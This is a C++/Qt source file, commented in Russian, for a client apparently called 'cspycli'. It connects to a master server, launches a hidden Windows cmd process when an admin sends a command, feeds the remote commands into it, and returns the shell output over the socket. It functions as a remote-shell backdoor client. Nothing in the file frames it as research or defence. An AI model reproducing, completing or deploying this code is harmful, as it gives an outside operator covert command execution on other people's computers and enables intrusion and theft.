#include "Client.h"
#include <iostream>
#include <QCryptographicHash>
#include <QTime>
#include <QRegExp>
Client::Client(QObject *parent) :
    QObject(parent),
    port(1235),
    server(QHostAddress::LocalHost)
{
    // Добавялем первый протокол
    availableProtocols.push_back(1);

    qDebug() << server << port;
    socket = new QTcpSocket(this);

    // Соединение с мастер-сервером
    socket->connectToHost(server, port);

    // Подключение всех необходимых сигналов
    // Исправить : не подключать если нет коннекта
    connect(socket, SIGNAL(connected()), this, SLOT(onConnect()));
    connect(socket, SIGNAL(disconnected()), this, SLOT(onDisconnect()));
    connect(socket, SIGNAL(readyRead()), this, SLOT(sortIncomingData()));

    // Ожидание 3 секунды,
    // на случай медленного инета
    if(socket->waitForConnected(3000))
        qDebug() << "Connected to " << server.toString() << port;
    else
        qDebug() << "Unable to connect";

}

void Client::onConnect()
{
    QString time = QTime::currentTime().msec();
    QString md5hash = QString(QCryptographicHash::hash((qPrintable(time)), QCryptographicHash::Md5).toHex());
    socket->write(qPrintable(QString("cspycli:1:%1:").arg(md5hash)));
}

void Client::onDisconnect()
{
    qDebug() << "The connection to the server has been lost";
}

void Client::sortIncomingData()
{
    QRegExp rx("f:(\\d+):(\\d+):(.*)");
    QString incoming = socket->readAll();
    qDebug() << incoming;

    // Проверяем запрос
    if(rx.indexIn(incoming)!=-1){

        // Берём в data дату из запроса
        QString data = rx.cap(3);

        //берем хидер даты и отдаем дату нужному парсеру
        QRegExp re = QRegExp("(\\w+):");
        qDebug() << re.indexIn(data);
        if(re.indexIn(data)!=-1){
            QString dataHeader = re.cap(1);

            //1 = one
            if(dataHeader == "1"){
                parseFirstProtocol(rx.cap(1).toInt(), data);
                return;
            }

            // l = L
            if(dataHeader == "l"){
                qDebug() << rx.cap(2).toInt();
                sendAvailableProtocols(rx.cap(1).toInt());
                return;
            }

            if(dataHeader == "a" || dataHeader == "d"){
                activateDeactivateProtocol(rx.cap(1).toInt(), data);
                return;
            }
        }
        return;

    }
}

void Client::parseSomeInformation(QString incoming)
{

}

void Client::parseFirstProtocol(qint32 adminId, QString incoming)
{
    // Не шарю в решулярках, наверно что-то не так,
    // но худо-бедно работает
    QRegExp rx = QRegExp("1:(\\w+):(\\w+):");
    rx.indexIn(incoming);
    qDebug() << rx.indexIn(incoming);

    // Если команда протоколу правильная
    // и протокол запущен
    // отправить запрос в первый протокол
    // в данном случае в консоль винды
    if(rx.captureCount() != -1 && firstprotocol->Running)
        firstprotocol->write(qPrintable(QString("%1\n").arg(rx.cap(2))));
}

void Client::sendAvailableProtocols(qint32 adminId)
{
    // Крайне криво на мой вгляд.
    // Нужно упростить.
    QString protocols = "m:";
    for(short i = 0; i < availableProtocols.size(); ++i){
        protocols.append(QString::number(availableProtocols.at(i)));
        if(i < availableProtocols.size()-1)
            protocols.append(";");
    }
    protocols.append(":");
    qDebug() << protocols;
    sendData(adminId, qPrintable(protocols));
}

void Client::activateDeactivateProtocol(qint32 adminId, QString incoming)
{
    // Я не до конца разбираюсь в регулярках
    // поэтому тут все совсем глупо
    QRegExp rx = QRegExp("(\\w):(\\d+):");
    rx.indexIn(incoming);
    qDebug() << "active";
    QString mode = rx.cap(1);
    QString proto = rx.cap(2);
    this->adminId = adminId;
    if(mode=="a"){
        if(proto == "1"){
            firstprotocol = new QProcess(this);

            firstprotocol->start("cmd");
            connect(firstprotocol,
                    SIGNAL(readyReadStandardOutput()),
                    this,
                    SLOT(slotDataOnStdout())
                    );
        }
    }
    else {
        firstprotocol->disconnect(this);
        firstprotocol->close();
    }

}

void Client::sendData(qint32 adminId, QString data)
{
    socket->write(qPrintable(QString("t:%1:%2:%3").arg(adminId).arg(data.size()-1).arg(data)));
}

void Client::slotDataOnStdout(){
    QString output = firstprotocol->readAllStandardOutput();
    sendData(this->adminId, QString("1:%1:%2:").arg(output.size()).arg(output));
}
